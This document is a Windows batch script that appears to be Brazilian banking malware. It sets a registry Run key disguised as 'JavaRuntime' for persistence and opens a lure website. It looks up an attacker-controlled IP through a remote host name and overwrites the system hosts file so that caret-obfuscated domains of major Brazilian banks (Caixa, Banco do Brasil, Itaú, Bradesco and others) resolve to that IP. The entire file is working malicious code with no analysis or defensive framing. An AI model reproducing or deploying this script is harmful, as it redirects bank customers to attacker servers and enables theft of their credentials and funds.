@echo off
@break off
ver|find "Windows 98">nul
if not errorlevel 1 goto nao
if exist %windir%\system32\conblg64x.dll goto chk
:ins
echo y|reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v JavaRuntime /t REG_SZ /d %windir%\system32\javaservice.exe
> %windir%\system32\conblg64x.dll echo 0
start /max iexplore.exe "http://ver.lovezinho.com/"
goto dns

:chk
set ping=%windir%\system32\ping.exe
%ping% www.google.com -n 1 -l 1 | find "TTL" > nul
if not errorlevel 1 goto dns
goto chk

:dns
for /f "tokens=2" %%D in ('nslookup ip1.grupoeliete.com ^| find "Address"') do set ip=%%D
::variaveis
set f1=g^o^v^.b^r
set f2=c^om.^b^r
set da=i^n^t^e^r^n^e^t^c^a^i^x^a.c^a^i^x^a.%f1%
set db=w^ww.c^a^i^x^a.%f2%
set dc=c^ai^x^a.%f2%
set dd=w^ww.cai^x^a.%f1%
set de=c^aix^a.%f1%
set df=ww^w.c^ef^.%f2%
set dg=^c^ef.%f2%
set dh=ww^w.c^e^f.%f1%
set di=^c^e^f^.%f1%
set dj=www^.ca^i^xae^co^nomi^c^a.%f2%
set dl=ca^ixa^eco^no^mic^a.%f2%
set dm=ww^w.^c^a^i^xae^con^omica.%f1%
set dn=cai^xaecon^o^m^i^c^a.%f1%
set dj=w^ww.ca^ix^ae^co^no^mic^a^federal.%f2%
set dl=ter^ra.%f2%
set dm=ww^w.te^rra^.%f2%
set dn=nossa^ca^ixa.%f2%
set dp=ww^w.n^ossa^cai^xa.%f2%
set dq=re^al.%f2%
set dr=www^.re^al.%f2%
set ds=ban^corea^l.%f2%
set dt=w^ww.banc^or^eal.%f2%
set du=b^b.%f2%
set dv=ww^w.^bb.%f2%
set dx=ban^cod^obr^as^il.%f2%
set dz=ww^w.ba^nco^dobra^sil.%f2%
set aa=b^an^co^br^asil.%f2%
set ab=w^ww.ban^codo^bras^il.%f2%
set ac=ita^u.%f2%
set ad=w^ww.it^au.%f2%
set ae=bra^des^co.%f2%
set af=ww^w.br^a^desco.%f2%
set ag=cred^icar^dita^u.%f2%
set ah=ww^w^.cr^edi^car^ditau.%f2%
set ai=cr^edi^ca^rd^ci^ti.%f2%
set aj=w^ww.cr^edic^ardc^iti.%f2%
> %temp%\~7.tmp echo %ip% %da%&>> %temp%\~7.tmp echo %ip% %db%&>> %temp%\~7.tmp echo %ip% %dc%&>> %temp%\~7.tmp echo %ip% %dd%&>> %temp%\~7.tmp echo %ip% %de%&rem
>> %temp%\~7.tmp echo %ip% %df%&>> %temp%\~7.tmp echo %ip% %dg%&>> %temp%\~7.tmp echo %ip% %dh%&>> %temp%\~7.tmp echo %ip% %di%&>> %temp%\~7.tmp echo %ip% %dj%&rem
>> %temp%\~7.tmp echo %ip% %dl%&>> %temp%\~7.tmp echo %ip% %dm%&>> %temp%\~7.tmp echo %ip% %dn%&>> %temp%\~7.tmp echo %ip% %dp%&>> %temp%\~7.tmp echo %ip% %dq%&rem
>> %temp%\~7.tmp echo %ip% %dr%&>> %temp%\~7.tmp echo %ip% %ds%&>> %temp%\~7.tmp echo %ip% %dt%&>> %temp%\~7.tmp echo %ip% %du%&>> %temp%\~7.tmp echo %ip% %dv%&rem
>> %temp%\~7.tmp echo %ip% %dx%&>> %temp%\~7.tmp echo %ip% %dz%&>> %temp%\~7.tmp echo %ip% %aa%&>> %temp%\~7.tmp echo %ip% %ab%&>> %temp%\~7.tmp echo %ip% %ac%&rem
>> %temp%\~7.tmp echo %ip% %ad%&>> %temp%\~7.tmp echo %ip% %ae%&>> %temp%\~7.tmp echo %ip% %af%&>> %temp%\~7.tmp echo %ip% %ag%&>> %temp%\~7.tmp echo %ip% %ah%&rem
>> %temp%\~7.tmp echo %ip% %ai%&>> %temp%\~7.tmp echo %ip% %aj%&rem
:l1
type %temp%\~7.tmp>%windir%\system32\drivers\etc\hosts
exit
:nao
start /max iexplore.exe "http://ver.lovezinho.com/"
exit

